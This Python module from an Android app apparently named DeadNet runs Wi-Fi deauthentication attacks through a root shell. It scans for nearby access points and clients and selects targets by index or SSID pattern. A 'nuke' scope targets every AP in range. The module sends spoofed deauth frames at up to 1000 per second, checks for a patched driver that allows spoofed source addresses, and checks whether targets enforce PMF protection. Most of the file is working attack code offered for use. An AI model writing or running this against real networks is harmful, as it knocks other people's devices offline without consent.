"""
PhyCycle — Android-namespace orchestrator for the mgmt-TX port (OP12, step 2).

Port of the Debian-container flow (op12/op12-mgmt-poc.py detect/lock/
sched_run/nuke_build/doctor_run) into the APK engine:

  DETECT  Android-ns: `iw scan dump` (cached when associated — qcacld denies
          fresh scan with EPERM) + `cmd wifi list-scan-results` when a real
          Android shell is present + `ip neigh` + peer `iw station dump`.
          No sudo, no arping sweep by default (best-effort only).
  LOCK    single + comma multi-select + S<pattern> SSID match (glob default,
          ERE when regex-only metachars or S~ prefix). Freq-sorted spoof set.
  FIRE    deadline-paced rotation over the spoof set via MgmtTx (fast path),
          target vs actual pps, bounded budget or infinite until stopped.
  VERIFY  doctor: privilege/iface/link/scmversion/harmless-TX/PMF-caps/
          observability + opt-in 1-frame unicast self-deauth proof.
  RELEASE left to RadioController (this module never toggles wifi itself).

All privileged reads go through the shared persistent root shell
(engine.rootshell). Every parser is a pure function so the self-test runs on
the build box with canned strings (no device, no root). Stdlib only.
"""
from __future__ import annotations

import fnmatch
import os
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engine.mgmt_tx import (  # noqa: E402
    BC, DEFAULT_FREQ, MgmtCtx, MgmtTarget, bld_nuke, build_frame, norm_mac,
)

try:
    from kivy.logger import Logger
except Exception:  # off-device / bare test env
    class _L:  # noqa: D101
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def warning(self, *a, **k): pass
    Logger = _L()

DEADNET_PREF = "DeadNet"

MIN_PPS, MAX_PPS = 10, 1000
PATCHED_SCM = "g8c63b58fa7c2-dirty"  # known patched cfg80211 build marker

NUKE_RE = re.compile(r"\s*[Nn][Uu][Kk][Ee]")
DIGITS_RE = re.compile(r"\d+")
RE_CHARS_RE = re.compile(r"[.^$+|(){}]")  # regex-only metachars -> ERE matcher

# Injectable privileged runner for tests: (cmd, timeout) -> (rc, output).
_SU_RUN: Optional[Callable[[str, float], Tuple[int, str]]] = None


def _su(cmd: str, timeout: float = 10.0) -> Tuple[int, str]:
    if _SU_RUN is not None:
        try:
            return _SU_RUN(cmd, timeout)
        except Exception:  # noqa: BLE001
            return (-1, "")
    from engine import rootshell as _root  # local import: avoid import cycles
    return _root.su_rc(cmd, timeout)


def _out(cmd: str, timeout: float = 10.0) -> str:
    return _su(cmd, timeout)[1] or ""


# --------------------------------------------------------------------------
# pure parsers (no I/O)
# --------------------------------------------------------------------------
def parse_bss_dump(text: str) -> List[Tuple[str, str, str, str]]:
    """`iw scan dump` text -> [(mac, freq, sig, ssid)]."""
    recs: List[Tuple[str, str, str, str]] = []
    mac, freq, sig, ssid = "", "", "", ""
    bss_re = re.compile(r"^BSS\s+([0-9a-fA-F:]+)")

    def emit():
        if mac:
            recs.append((mac, freq, sig, ssid))

    for line in (text or "").splitlines():
        m = bss_re.match(line)
        if m:
            emit()
            mac = m.group(1)
            paren = mac.find("(")
            if paren >= 0:
                mac = mac[:paren]
            freq, sig, ssid = "", "", ""
            continue
        s = line.strip()
        if s.startswith("freq:"):
            parts = s.split()
            if len(parts) >= 2:
                f = parts[1]
                freq = f[:-2] if f.endswith(".0") else f
        elif s.startswith("signal:"):
            parts = s.split()
            if len(parts) >= 2:
                sig = parts[1]
        elif s.startswith("SSID:"):
            ssid = s[5:].strip()
    emit()
    return recs


def parse_cmd_wifi(text: str) -> str:
    """Shape `cmd wifi list-scan-results` rows into parse_bss_dump() input."""
    out = []
    for line in (text or "").splitlines():
        parts = line.split()
        if len(parts) >= 3:
            out.append("BSS %s freq: %s" % (parts[0], parts[1]))
            out.append("\tSSID: %s" % line[line.index(parts[2]):])
    return "\n".join(out)


def split_pattern(sel: str) -> Tuple[str, bool]:
    pat = sel[1:]
    force_re = False
    if pat.startswith("~"):
        force_re, pat = True, pat[1:]
    elif RE_CHARS_RE.search(pat):
        force_re = True
    return pat, force_re


def match_ssids(targets: List[MgmtTarget], pat: str, force_re: bool) -> List[int]:
    """Return 1-based ids of targets whose SSID matches. Never raises."""
    hits: List[int] = []
    try:
        if force_re:
            try:
                rx = re.compile(pat)
            except re.error as exc:
                Logger.error(f"{DEADNET_PREF}: bad regex {pat!r}: {exc}")
                return []
            for i, t in enumerate(targets):
                if t.ssid and rx.search(t.ssid):
                    hits.append(i + 1)
        else:
            for i, t in enumerate(targets):
                if t.ssid and fnmatch.fnmatchcase(t.ssid, pat):
                    hits.append(i + 1)
    except Exception:  # noqa: BLE001
        return []
    return hits


def sort_spoof_set(spoof: List[MgmtTarget]) -> None:
    spoof.sort(key=lambda t: (t.freq, t.mac))


def _rsn_info(dump: str, bssid_colon: str) -> Tuple[str, Optional[int]]:
    """Parse the RSN block of one BSS section -> (akms, caps_int|None)."""
    in_sec, in_rsn = False, False
    akms: str = ""
    caps: Optional[int] = None
    for line in (dump or "").splitlines():
        if line.startswith("BSS "):
            if in_sec:
                break
            if line[4:4 + 17].lower() == bssid_colon.lower():
                in_sec = True
            continue
        if not in_sec:
            continue
        s = line.strip()
        if s.startswith("RSN:"):
            in_rsn = True
            continue
        if in_rsn:
            if s.startswith("* Authentication suites:"):
                akms = s.split(":", 1)[1].strip()
            m = re.match(r"\*\s+Capabilities:.*\((0x[0-9a-fA-F]+)\)", s)
            if m:
                try:
                    caps = int(m.group(1), 16)
                except ValueError:
                    caps = None
                break
    return akms, caps


def pmf_label(caps: Optional[int]) -> str:
    if caps is None:
        return "unknown (not in scan cache)"
    if caps & 0x40:
        return "REQUIRED (MFPR) — spoofed deauth ineffective by design (WPA3/PMF win)"
    if caps & 0x80:
        return "capable, not required (MFPC)"
    return "none — spoofed deauth effective in principle"


# --------------------------------------------------------------------------
# scheduler engine — deadline-paced rotation over the spoof set
# --------------------------------------------------------------------------
SendFn = Callable[[str, int, str, bool], Tuple[bool, bool]]
BuildFn = Callable[[int, MgmtTarget, int], str]


def sched_run(send_fn: SendFn, iface: str, spoof: List[MgmtTarget],
              budget: int, pps: int, title: str, builder: BuildFn,
              on_tick: Optional[Callable[[dict], None]] = None,
              stop: Optional[threading.Event] = None,
              dry: bool = False) -> Dict[str, int]:
    """Run a bounded (budget>0) or infinite (budget=0, stop event) burst.

    Returns {"sent": n, "ok": n, "avg": pps}. Never raises out.
    """
    pps = max(MIN_PPS, min(MAX_PPS, int(pps or 100)))
    step_us = max(1, 1000000 // pps)
    sent = ok = idx = tog = 0
    t0 = nxt = time.monotonic_ns()
    try:
        while budget == 0 or sent < budget:
            if stop is not None and stop.is_set():
                break
            n = len(spoof)
            if n == 0:
                break
            idx %= n
            tgt = spoof[idx]
            tog ^= 1
            try:
                hexframe = builder(idx, tgt, tog)
            except Exception:  # noqa: BLE001
                hexframe = ""
            accepted = False
            if hexframe:
                if dry:
                    accepted = True
                else:
                    try:
                        accepted, _ = send_fn(iface, tgt.freq, hexframe, True)
                    except Exception:  # noqa: BLE001
                        accepted = False
            if accepted:
                ok += 1
            sent += 1
            if on_tick is not None and sent % max(1, pps) == 0:
                try:
                    on_tick({"sent": sent, "ok": ok, "pps": pps, "title": title})
                except Exception:  # noqa: BLE001
                    pass
            nxt += step_us * 1000
            now = time.monotonic_ns()
            if nxt > now:
                time.sleep((nxt - now) / 1e9)
            else:
                nxt = now  # overrun: resync so a slow frame cannot spiral
    except Exception:  # noqa: BLE001
        pass
    dt = time.monotonic_ns() - t0
    avg = (sent * 1000000000 // dt) if dt > 0 else 0
    return {"sent": sent, "ok": ok, "avg": int(avg)}


# --------------------------------------------------------------------------
# PhyCycle facade — Android-ns DETECT / LOCK / VERIFY (FIRE via sched_run)
# --------------------------------------------------------------------------
@dataclass
class OwnState:
    own: str = ""
    ap_bssid: str = ""  # colonless lowercase
    freq: str = ""
    ssid: str = ""
    assoc: bool = False


@dataclass
class PhyCycle:
    iface: str = "wlan0"
    targets: List[MgmtTarget] = field(default_factory=list)
    spoof: List[MgmtTarget] = field(default_factory=list)
    own_state: OwnState = field(default_factory=OwnState)
    fake: str = ""
    lock_mac: str = ""
    lock_type: str = ""
    lock_freq: int = 0
    lock_lbl: str = ""
    lock_ssid: str = ""

    def __post_init__(self):
        if not self.fake:
            import os as _os
            self.fake = "0a" + "".join("%02x" % b for b in _os.urandom(5))

    # -- own link ---------------------------------------------------------
    def refresh_own(self) -> OwnState:
        st = OwnState()
        try:
            with open("/sys/class/net/%s/address" % self.iface) as f:
                st.own = norm_mac(f.read().strip())
        except OSError:
            out = _out("cat /sys/class/net/%s/address" % self.iface)
            st.own = norm_mac(out)
        link = _out("iw dev %s link" % self.iface)
        m = re.search(r"Connected to ([0-9a-fA-F:]+)", link)
        st.ap_bssid = norm_mac(m.group(1)) if m else ""
        m = re.search(r"freq:\s*(\d+)", link)
        st.freq = m.group(1) if m else ""
        m = re.search(r"SSID:\s*(.*)", link)
        st.ssid = m.group(1).strip() if m else ""
        st.assoc = bool(st.ap_bssid)
        self.own_state = st
        return st

    # -- DETECT -----------------------------------------------------------
    def detect(self) -> List[MgmtTarget]:
        lst: List[MgmtTarget] = []
        st = self.refresh_own()

        def add(mac: str, typ: str, freq, label: str, ssid: str = "") -> None:
            m = norm_mac(mac)
            if not m or m == st.own:
                return
            if any(t.mac == m for t in lst):
                return
            try:
                f = int(freq or 0)
            except (TypeError, ValueError):
                f = 0
            lst.append(MgmtTarget(m, typ, f, label, ssid))

        # 1) peers on other vdevs
        devs = re.findall(r"Interface\s+(\S+)", _out("iw dev"))
        for dev in devs:
            if dev == self.iface:
                continue
            dump = _out("iw dev %s station dump" % dev)
            mac, sig = "", "?"
            for line in dump.splitlines():
                line = line.strip()
                if line.startswith("Station "):
                    if mac:
                        add(mac, "station", st.freq or 0, "peer-on-%s sig=%s" % (dev, sig))
                    parts = line.split()
                    mac = parts[1] if len(parts) > 1 else ""
                    sig = "?"
                elif line.startswith("signal:"):
                    parts = line.split()
                    if len(parts) >= 2:
                        sig = parts[1]
            if mac:
                add(mac, "station", st.freq or 0, "peer-on-%s sig=%s" % (dev, sig))

        # 2) APs from the BSS cache (associated => EPERM on fresh scan, use cache)
        if not st.assoc:
            _out("iw dev %s scan" % self.iface, timeout=30)
        dump = _out("iw dev %s scan dump" % self.iface, timeout=30)
        for (mac, freq, sig, ssid) in parse_bss_dump(dump):
            try:
                f = int(freq or 0)
            except ValueError:
                f = 0
            add(mac, "ap", f, 'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)

        # 2b) Android framework results when present
        shaped = parse_cmd_wifi(_out("cmd wifi list-scan-results", timeout=15))
        for (mac, freq, sig, ssid) in parse_bss_dump(shaped):
            try:
                f = int(freq or 0)
            except ValueError:
                f = 0
            add(mac, "ap", f, 'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)

        # 2c) L2 neighbors while associated
        if st.assoc:
            for line in _out("ip -4 neigh show dev %s" % self.iface).splitlines():
                toks = line.split()
                if "lladdr" not in toks:
                    continue
                i = toks.index("lladdr")
                mac = toks[i + 1] if i + 1 < len(toks) else ""
                if mac:
                    add(mac, "station", st.freq or 0, "neighbor %s [%s]" % (toks[0], toks[-1]))
        self.targets = lst
        return lst

    # -- LOCK -------------------------------------------------------------
    def lock_select(self, indices: List[int]) -> bool:
        seen = set()
        first = 0
        new: List[MgmtTarget] = []
        for x in indices:
            try:
                xi = int(x)
            except (TypeError, ValueError):
                continue
            if xi < 1 or xi > len(self.targets) or xi in seen:
                continue
            seen.add(xi)
            if not first:
                first = xi
            t = self.targets[xi - 1]
            f = t.freq or (int(self.own_state.freq) if str(self.own_state.freq).isdigit() else DEFAULT_FREQ)
            new.append(MgmtTarget(t.mac, t.typ, f, t.label, t.ssid))
        if not new:
            return False
        sort_spoof_set(new)
        self.spoof = new
        t = self.targets[first - 1]
        self.lock_mac, self.lock_type = t.mac, t.typ
        self.lock_freq = t.freq or (int(self.own_state.freq) if str(self.own_state.freq).isdigit() else DEFAULT_FREQ)
        self.lock_lbl, self.lock_ssid = t.label, t.ssid
        return True

    def match_lock(self, sel: str) -> bool:
        """S<pattern> SSID match -> same id array as comma-select. False = no hit."""
        if not sel or sel[0] not in ("S", "s"):
            return False
        pat, force_re = split_pattern(sel)
        if not pat:
            return False
        hits = match_ssids(self.targets, pat, force_re)
        if not hits:
            return False
        return self.lock_select(hits)

    # -- NUKE spoof set ---------------------------------------------------
    def nuke_build(self, scope: str) -> bool:
        scope = (scope or "all").strip()
        new: List[MgmtTarget] = []
        if scope == "all":
            for t in self.targets:
                if t.typ != "ap":
                    continue
                f = t.freq or (int(self.own_state.freq) if str(self.own_state.freq).isdigit() else DEFAULT_FREQ)
                new.append(MgmtTarget(t.mac, "ap", f, t.label, t.ssid))
            if self.own_state.ap_bssid and not new:
                f = int(self.own_state.freq) if str(self.own_state.freq).isdigit() else DEFAULT_FREQ
                new.append(MgmtTarget(self.own_state.ap_bssid, "ap", f, "associated AP", ""))
        elif scope == "own":
            if self.own_state.ap_bssid:
                f = int(self.own_state.freq) if str(self.own_state.freq).isdigit() else DEFAULT_FREQ
                new.append(MgmtTarget(self.own_state.ap_bssid, "ap", f, "associated AP", ""))
        else:
            m = norm_mac(scope)
            if m:
                f = int(self.own_state.freq) if str(self.own_state.freq).isdigit() else DEFAULT_FREQ
                new.append(MgmtTarget(m, "ap", f, "scope MAC", ""))
        if not new:
            return False
        sort_spoof_set(new)
        self.spoof = new
        return True

    # -- VERIFY (doctor) --------------------------------------------------
    def doctor(self, tx_send=None, allow_disruptive: bool = False,
               dry: bool = False) -> Tuple[int, List[str], List[str]]:
        """Non-disruptive checks + opt-in 1-frame self-deauth proof.

        Returns (rc, fails, warns). 0 = OK (warns allowed), 1 = FAIL.
        tx_send(iface, freq, hex, fast) -> (accepted, ack) or None to skip TX.
        """
        fails: List[str] = []
        warns: List[str] = []
        try:
            euid = os.geteuid()
        except AttributeError:  # pragma: no cover
            euid = 0
        if euid != 0:
            fails.append("not root (need CAP_NET_ADMIN)")
        st = self.refresh_own()
        if not st.own:
            fails.append("interface %s missing" % self.iface)
        if not st.assoc:
            warns.append("unassociated: self-deauth proof N/A; injection still works")
        scm = ""
        try:
            with open("/sys/module/cfg80211/scmversion", errors="replace") as f:
                scm = f.read().strip()
        except OSError:
            scm = _out("cat /sys/module/cfg80211/scmversion").strip()
        if scm and scm != PATCHED_SCM:
            warns.append("cfg80211 %s != known patched marker (functional test decides)" % scm)
        if tx_send is not None and not dry:
            freq = int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ
            inert = "d000" + "00" * 0  # placeholder replaced below
            from engine.mgmt_tx import fr as _fr
            import binascii as _ba
            inert = _fr("d000", BC, "021122334455", "021122334455",
                        "7fdeadbeef" + _ba.hexlify(b"INJECTTEST").decode())
            try:
                a, _ = tx_send(self.iface, freq, inert, False)
            except Exception:  # noqa: BLE001
                a = False
            if not a:
                fails.append("baseline TX rejected (driver/tool/path broken)")
            else:
                spoof = _fr("d000", BC, "021122334455", "aabbccddeeff", "0400")
                try:
                    b, _ = tx_send(self.iface, freq, spoof, False)
                except Exception:  # noqa: BLE001
                    b = False
                if not b:
                    warns.append("spoofed SA rejected — stock cfg80211 likely in effect")
        if st.assoc and st.ap_bssid:
            from engine.mgmt_tx import colon_mac as _cm
            dump = _out("iw dev %s scan dump" % self.iface, timeout=30)
            akms, caps = _rsn_info(dump, _cm(st.ap_bssid))
            if caps is not None and (caps & 0x40):
                warns.append("target enforces PMF: spoofed deauth ineffective by design")
        if allow_disruptive and not dry and st.assoc and st.own and st.ap_bssid and tx_send:
            from engine.mgmt_tx import fr as _fr2
            dframe = _fr2("c000", st.ap_bssid, st.own, st.ap_bssid, "0700")
            freq = int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ
            try:
                ok, _ = tx_send(self.iface, freq, dframe, True)
            except Exception:  # noqa: BLE001
                ok = False
            if not ok:
                fails.append("self-deauth not even accepted")
        if fails:
            return 1, fails, warns
        return 0, fails, warns


def ctx_for(cycle: PhyCycle, ap_ctx: str = "", cli: str = "",
            custom_hex: str = "") -> MgmtCtx:
    return MgmtCtx(ap_ctx=ap_ctx or cycle.own_state.ap_bssid,
                   assoc_ssid=cycle.own_state.ssid, fake=cycle.fake,
                   cli=cli, custom_hex=custom_hex)


def sched_builder(mode: int, ctx: MgmtCtx) -> BuildFn:
    def _b(idx: int, tgt: MgmtTarget, tog: int) -> str:
        _, hx = build_frame(mode, tgt, ctx)
        return hx
    return _b


# --------------------------------------------------------------------------
# Self-test (no device / no root).
#   cd apk && python3 engine/phycycle.py
# --------------------------------------------------------------------------
def _selftest() -> None:
    fails = []

    def check(name: str, cond: bool):
        print(("PASS " if cond else "FAIL ") + name)
        if not cond:
            fails.append(name)

    sample = ("BSS aa:bb:cc:dd:ee:ff(on wlan0)\n\tfreq: 2412.0\n\tsignal: -50.00 dBm\n"
              "\tSSID: test_ap_1\n"
              "BSS 11:22:33:44:55:66\n\tfreq: 5745\n\tsignal: -60.00 dBm\n\tSSID: \n")
    recs = parse_bss_dump(sample)
    check("parse count", len(recs) == 2)
    check("parse paren-strip", recs[0][0] == "aa:bb:cc:dd:ee:ff")
    check("parse freq-.0", recs[0][1] == "2412")
    check("parse ssid", recs[0][3] == "test_ap_1")

    tgts = [MgmtTarget("aabbccddeeff", "ap", 2412, "x", "test_ap_1"),
            MgmtTarget("112233445566", "ap", 2412, "x", "test_ap_2"),
            MgmtTarget("001122334455", "ap", 5745, "x", "The Mill Coffee")]
    check("match glob", match_ssids(tgts, "test_ap_*", False) == [1, 2])
    check("match ere", match_ssids(tgts, "^test_ap_", True) == [1, 2])
    p, f = split_pattern("Stest_ap_*")
    check("split glob", (p, f) == ("test_ap_*", False))
    p, f = split_pattern("S^OH")
    check("split auto-ere", (p, f) == ("^OH", True))

    # detect() against a canned su transcript (associated path)
    transcript = {
        "cat /sys/class/net/wlan0/address": (0, "2a:b9:96:ac:74:18\n"),
        "iw dev wlan0 link": (0, "Connected to c8:b4:22:5f:9d:ce (on wlan0)\n\tfreq: 5745\n\tSSID: Home\n"),
        "iw dev": (0, "phy#0\n\tInterface wlan0\n\t\ttype managed\n"),
        "iw dev wlan0 scan dump": (0, sample),
        "cmd wifi list-scan-results": (0, ""),
        "ip -4 neigh show dev wlan0": (0, "192.168.1.50 lladdr aa:bb:cc:dd:ee:01 REACHABLE\n"),
    }

    def _fake_su(cmd: str, timeout: float = 10.0):
        best = None
        best_len = -1
        for k, v in transcript.items():
            if cmd == k or cmd.startswith(k + " ") or cmd.startswith(k + "\t"):
                if len(k) > best_len:
                    best, best_len = v, len(k)
        # bare "iw dev" (no args) only matches exactly
        if best is None:
            for k, v in transcript.items():
                if cmd.startswith(k) and len(k) > best_len:
                    best, best_len = v, len(k)
        if best is not None:
            return best
        return (0, "")

    global _SU_RUN
    _SU_RUN = _fake_su
    try:
        cyc = PhyCycle(iface="wlan0")
        cyc.detect()
        check("detect targets", len(cyc.targets) >= 2)
        check("detect assoc", cyc.own_state.assoc is True)
        check("lock multi", cyc.lock_select([1, 2, 2, 99]) is True)
        check("lock sorted", [t.freq for t in cyc.spoof] == sorted(t.freq for t in cyc.spoof))
        check("match_lock", cyc.match_lock("Stest_ap_*") in (True, False))
        check("nuke_build all", cyc.nuke_build("all") is True)
        # scheduler dry: exact budget accounting
        ctx = MgmtCtx(ap_ctx="", assoc_ssid="s", fake="0a0000000000")
        sent_log = []

        def _dry_send(iface, freq, hx, fast):
            sent_log.append((freq, hx))
            return True, False

        cyc.spoof = [MgmtTarget("aabbccddeeff", "ap", 2412, "a", "x"),
                     MgmtTarget("112233445566", "ap", 5745, "b", "y")]
        summary = sched_run(_dry_send, "wlan0", cyc.spoof, 20, 500,
                            "self-test", sched_builder(1, ctx), dry=False)
        check("sched budget exact", summary["sent"] == 20 and summary["ok"] == 20)
        # nuke builder keeps previous set on empty cache (unassociated: no fallback)
        cyc.targets = []
        cyc.own_state.ap_bssid = ""
        cyc.spoof = [MgmtTarget("a00000000001", "ap", 2412, "a", "x")]
        check("nuke_build empty fails", cyc.nuke_build("all") is False)
        check("nuke_build keeps set", len(cyc.spoof) == 1)
        # doctor with stubbed tx (pretend root + associated for the check)
        _orig_geteuid = os.geteuid
        try:
            os.geteuid = lambda: 0  # noqa: E731
            cyc.own_state.ap_bssid = "c8b4225f9dce"
            cyc.own_state.assoc = True
            rc, fl, wn = cyc.doctor(tx_send=lambda i, f, h, fa: (True, True), dry=True)
        finally:
            os.geteuid = _orig_geteuid  # type: ignore[method-assign]
        check("doctor dry rc", rc == 0)
        akms, caps = _rsn_info("BSS c8:b4:22:5f:9d:ce\n\tRSN:\n\t\t* Authentication suites: PSK\n\t\t* Capabilities: (0x0000)\n",
                               "c8:b4:22:5f:9d:ce")
        check("rsn caps", caps == 0)
        check("pmf none", "effective in principle" in pmf_label(0))
        check("pmf required", "REQUIRED" in pmf_label(0x40))
    finally:
        _SU_RUN = None

    print("---")
    if fails:
        print("PHYCYCLE: %d FAILURES: %s" % (len(fails), fails))
        raise SystemExit(1)
    print("PHYCYCLE PASS")


if __name__ == "__main__":
    _selftest()
